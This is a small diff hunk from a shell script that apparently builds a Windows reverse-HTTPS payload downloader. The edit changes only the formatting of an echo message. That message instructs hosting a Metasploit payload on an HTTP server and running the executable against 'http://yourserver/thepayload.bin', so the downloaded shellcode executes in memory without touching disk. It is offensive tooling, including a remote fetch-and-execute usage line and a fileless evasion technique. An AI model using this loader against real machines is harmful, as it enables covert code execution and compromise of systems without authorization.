@@ -54,7 +54,7 @@ strip output/downloadsocket_revhttps_win32.exe
 # cleanup
 cleanup_techniques
 
-echo "The generated msf payload needs to be hosted on a HTTP server\n
-Call your executable like:\n
-downloadsocket_revhttps_win32.exe http://yourserver/thepayload.bin\n
+echo "The generated msf payload needs to be hosted on a HTTP server
+Call your executable like:
+downloadsocket_revhttps_win32.exe http://yourserver/thepayload.bin
 The executable will then download, read the file into memory via sockets (no file is dropped on disk) and finally execute the downloaded shellcode."
